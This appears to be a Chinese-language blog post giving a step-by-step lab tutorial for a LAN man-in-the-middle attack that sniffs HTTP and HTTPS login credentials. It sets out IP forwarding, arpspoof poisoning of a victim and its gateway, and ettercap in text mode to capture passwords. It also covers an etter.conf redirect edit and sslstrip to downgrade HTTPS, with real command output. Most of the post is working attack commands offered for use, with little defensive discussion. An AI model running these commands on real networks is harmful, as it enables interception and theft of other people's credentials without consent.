@@ -1,0 +1,176 @@
+---
+layout: post
+title:  "网络安全-局域网https嗅探"
+categories: 网络安全
+tags: 网络安全 https嗅探
+author: xueyp
+description: 局域网https嗅探,arpspoof,sslstrip,ettercap
+---
+
+局域网http嗅探是一种典型的中间人攻击（man-in-the-middle)，攻击者扮演中间人进行攻击，可以劫持一段http/https会话，窃取凭证和其他机密信息。
+
+# 搭建环境 
+
+## 环境
+- 主机1: 172.16.1.253 manjaro系统
+
+需安装arpspoof,sslstrip,ettercap,其中arpspoof在dsniff包中。kali自带所有工具。
+
+开启ip转发：
+
+```
+echo 1 >/proc/sys/net/ipv4/ip_forward
+cat /proc/sys/net/ipv4/ip_forward #若结果为1说明开启成功。
+```
+
+以上为临时开启，若想重启后还生效，需要配置：
+
+```
+/etc/sysctl.d/30-ipforward.conf
+
+net.ipv4.ip_forward=1
+```
+
+- 主机2: 172.16.1.252 windows系统
+
+## 所用软件
+
+- arpspoof
+
+arpspoof是一种用作ARP欺骗的一种中间人攻击工具，通过毒化受害者的ARP缓存，将网关的MAC替换成攻击者的MAC，于是攻击者的主机实际上就充当了受害主机的网关，之后攻击者就可以截获受害者发出和接到的数据包，从中获取账号密码、银行卡信息等。
+
+- sslstrip
+
+在日常上网过程中，用户只是在地址栏中输入网站域名，而不添加协议类型，如HTTP和HTTPS。这时，浏览器会默认在域名之前添加http://，然后请求网站。如果网站采用HTTPS协议，就会发送一个302重定向状态码和一个HTTPS的跳转网址，让浏览器重新请求。浏览器收到后，会按照新的网址，进行访问，从而实现数据安全加密。由于存在一次不安全的HTTP的请求，所以整个过程存在安全漏洞。
+
+sslstrip工具就是利用这个漏洞，实施攻击。渗透测试人员通过中间人攻击方式，将目标的数据转发到攻击机。sslstrip将跳转网址的HTTPS替换为HTTP，发给目标。目标以HTTP方式重新请求，而sslstrip将HTTP替换为HTTPS，请求对应的网站。这样就形成了，目标和ssltrip之间以HTTP明文方式传输，而sslstrip和服务器以HTTPS加密方式传输。这样，渗透人员就可以轻松获取明文数据了。
+
+- ettercap
+
+ettercap是一款现有流行的网络抓包软件，他利用计算机在局域网内进行通信的ARP协议的缺陷进行攻击，在目标与服务器之间充当中间人，嗅探两者之间的数据流量，从中窃取用户的数据资料。
+
+ettercap有两种运行方式，UNIFIED和BRIDGED。UNIFIED的方式是以中间人方式嗅探，基本原理是同时欺骗主机A和B，将自己充当一个中间人的角色，数据在A和B之间传输时会通过C，C就可以对数据进行分析，从而完成嗅探。BRIDGED方式是在双网卡情况下，嗅探两块网卡之间的数据包。
+
+ettercap的sniffing工作方式划分为五种：
+
+1. IPBASED：在基于IP地址的sniffing方式下，ettercap将根据源IP-PORT和目的IP-PORT来捕获数据包；
+
+2. MACBASED：在基于MAC地址的方式下，ettercap将根据源MAC和目的MAC来捕获数据包（在捕获通过网关的数据包时，该方式很有用）；
+
+3. ARPBASED：在基于Arp欺骗的方式下，ettercap利用Arp欺骗在交换局域网内监听两个主机之间的通信（全双工）；
+
+4. SMARTARP：在SMARTARP方式下，ettercap利用Arp欺骗，监听交换网上某台主机与所有已知的其他主机（存在于主机表中的主机）之间的通信（全双工）；
+
+5. PUBLICARP：在PUBLICARP 方式下，ettercap利用Arp欺骗，监听交换网上某台主机与所有其它主机之间的通信（半双工）。此方式以广播方式发送Arp响应，但是如果 ettercap已经拥有了完整的主机地址表（或在ettercap启动时已经对LAN上的主机进行了扫描），ettercap会自动选取 SMARTARP方式，而且Arp响应会发送给被监听主机之外的所有主机，以避免在Windows主机上出现IP地址冲突的消息。
+
+# 实施嗅探
+
+- 在主机1开启欺骗
+
+```
+sudo arpspoof -i enp2s0 -t 172.16.1.252 172.16.1.254 #（-i：后面跟攻击机网卡   -t：后面跟受害机的ip和网关）
+1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
+1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
+1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
+1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
+1c:6f:65:de:d4:80 20:47:47:3f:7b:8a 0806 42: arp reply 172.16.1.254 is-at 1c:6f:65:de:d4:80
+
+```
+
+- 在主机1开启密码嗅探
+
+新建一个终端，用ettercap命令截取对方输入的账号密码
+
+```
+sudo ettercap  -Tq  -i enp2s0 #（-T：启动文本模式  q：安静模式     -i：攻击机网卡）
+
+ettercap 0.8.2 copyright 2001-2015 Ettercap Development Team
+
+Listening on:
+enp2s0 -> 1C:6F:65:DE:D4:80
+      172.16.1.253/255.255.255.0
+      fe80::1e6f:65ff:fede:d480/64
+      fda8:5929:4981:0:1e6f:65ff:fede:d480/64
+      fda8:5929:4981::823/128
+
+SSL dissection needs a valid 'redir_command_on' script in the etter.conf file
+Privileges dropped to EUID 65534 EGID 65534...
+
+  33 plugins
+  42 protocol dissectors
+  57 ports monitored
+20388 mac vendor fingerprint
+1766 tcp OS fingerprint
+2182 known services
+
+Randomizing 255 hosts for scanning...
+Scanning the whole netmask for 255 hosts...
+* |==================================================>| 100.00 %
+
+57 hosts added to the hosts list...
+Starting Unified sniffing...
+
+
+Text only Interface activated...
+Hit 'h' for inline help
+
+DHCP: [00:22:AA:E7:BC:C0] DISCOVER 
+
+```
+
+- 在主机2用http协议访问网站并输入账号密码，就能截取到账号密码等一系列信息，需要注意的是，若用户名是中文汉字，截取下来的user类似于%E8%E6%86  这样的，需要手动URL解码。
+
+# https嗅探 
+
+https协议网站的账号密码获取方式与其相似，只不过中间加了一个步骤。
+
+- 在主机1开启欺骗
+
+```
+sudo arpspoof -i enp2s0 -t 172.16.1.252 172.16.1.254
+```
+
+- 开启
+
+vim  /etc/ettercap/etter.conf    去掉linux下的俩个注释,此处要注意的是，如果用的是ipchains，则去掉如下注释。
+
+```
+#---------------
+#     Linux 
+#---------------
+
+# if you use ipchains:
+   redir_command_on = "ipchains -A input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
+   redir_command_off = "ipchains -D input -i %iface -p tcp -s 0/0 -d 0/0 %port -j REDIRECT %rport"
+```
+
+若用的是iptables,刚去掉# if you use iptables:下两行的注释。
+
+然后，运行sslstrip
+
+```
+sudo sslstrip   -a  -f  -k  
+sslstrip 0.9 by Moxie Marlinspike running...
+```
+--------------------- 
+
+- 在主机1开启密码嗅探
+
+新建一个终端，用ettercap命令截取对方输入的账号密码
+
+```
+sudo ettercap  -Tq  -i enp2s0
+```
+
+然后在主机2访问https网站，即可截获密码。
+
+参考
+============
+
+[Arpspoof工具](https://wizardforcel.gitbooks.io/daxueba-kali-linux-tutorial/content/58.html)
+
+[SSLSTRIP in a Man in the Middle Attack](https://www.cybrary.it/0p3n/sslstrip-in-man-in-the-middle-attack/)
+
+[Man In the Middle attacks with sslstrip and arpspoof](https://wmsmartt.wordpress.com/2011/08/30/man-in-the-middle-attacks-with-sslstrip-and-arpspoof/)
+
+版权声明：本文为博主原创文章，转载请注明出处。 [旭日酒馆](https://xueyp.github.io/)
